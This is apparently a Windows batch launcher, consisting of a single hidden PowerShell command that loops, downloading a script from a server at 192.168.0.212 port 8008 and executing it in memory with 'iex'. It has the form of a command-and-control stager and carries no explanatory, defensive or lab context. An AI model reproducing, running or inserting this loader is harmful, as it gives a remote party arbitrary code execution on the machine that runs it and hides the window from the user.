@echo off
powershell.exe -noP -w 1 "do{sleep 5;iwr http://192.168.0.212:8008/download/powershell -usebasicparsing|iex}until((tnc 192.168.0.212 -Port 8008 -informationlevel quiet) -eq $true)"
